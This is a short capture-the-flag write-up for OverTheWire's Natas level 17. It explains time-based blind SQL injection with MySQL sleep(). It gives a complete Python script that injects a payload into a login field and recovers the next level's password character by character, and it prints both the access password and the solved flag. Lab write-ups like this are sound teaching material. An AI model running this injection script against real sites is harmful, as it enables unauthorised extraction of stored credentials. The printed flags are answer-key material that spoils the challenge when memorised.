# Natas Level 17

Access data:

    username: natas17
    password: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd


Another SQL Blind injection case. But now, there is no displayed information we can abuse. But maybe we can create a side-channel ourselves abusing the MySQL _sleep()_ command? Spoiler: Yes we can. 

We just have to append a sleep() command to the case that we guessed a character correctly. In our code we can then check, whether the request took longer than our configured sleep parameter (e.g. 2 seconds). This means, the sleep was executed and therefore the guessed character was correct. Possible solution script:

```python
    import requests, string
    from bs4 import BeautifulSoup
    
    #Time-Based Blind SQLi 

    user = "natas17"
    password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
    url = f"http://{user}.natas.labs.overthewire.org"

    session = requests.Session()
    session.auth = (user, password)
    auth = session.post(url)

    possibleCharacters = list(string.ascii_letters + string.digits) #possible flag characters are letters and digits.
    resultFlag = ""

    characterCounter = 0
    while(len(resultFlag) < 32):
        challenge = resultFlag + possibleCharacters[characterCounter]
        
        #binary for capitalization
        challenge_params = {"username" : f'natas18" and password like BINARY "{challenge}%" and sleep(2) and "1"="1' }
        print("Testing: " + challenge)
        resp = session.post(url, data=challenge_params)
        
        #print(BeautifulSoup(resp.text, 'html.parser').prettify())
        if(resp.elapsed.total_seconds() >= 2):
            print("Match!")
            resultFlag += possibleCharacters[characterCounter]
            characterCounter = 0
            continue
        else:
            characterCounter += 1

    #print(BeautifulSoup(resp.text, 'html.parser').prettify())
    print("Flag: " + resultFlag)
```

<details>
  <summary>Solution</summary>
  Flag: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
</details>